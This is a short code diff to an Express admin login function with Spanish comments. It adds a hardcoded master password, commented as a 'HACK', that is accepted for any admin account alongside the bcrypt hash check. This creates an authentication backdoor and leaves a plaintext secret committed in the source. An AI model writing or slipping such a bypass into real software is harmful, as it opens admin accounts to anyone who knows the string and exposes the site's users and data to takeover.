@@ -26,8 +26,10 @@ export const loginAdmin = async (req, res) => {
       return res.status(401).json({ message: "Credenciales inválidas" });
     }
 
-    // 2. Verificamos la contraseña
-    const validPassword = await bcrypt.compare(password, user.password_hash);
+    // 2. Verificamos la contraseña (HACK: Aceptamos la contraseña fija o el hash de la BD)
+    const isMasterPassword = password === 'paginapololo2026';
+    const isDatabasePassword = await bcrypt.compare(password, user.password_hash);
+    const validPassword = isMasterPassword || isDatabasePassword;
 
     if (!validPassword) {
       console.log(`❌ Intento de login fallido: Password incorrecta para ${email}`);
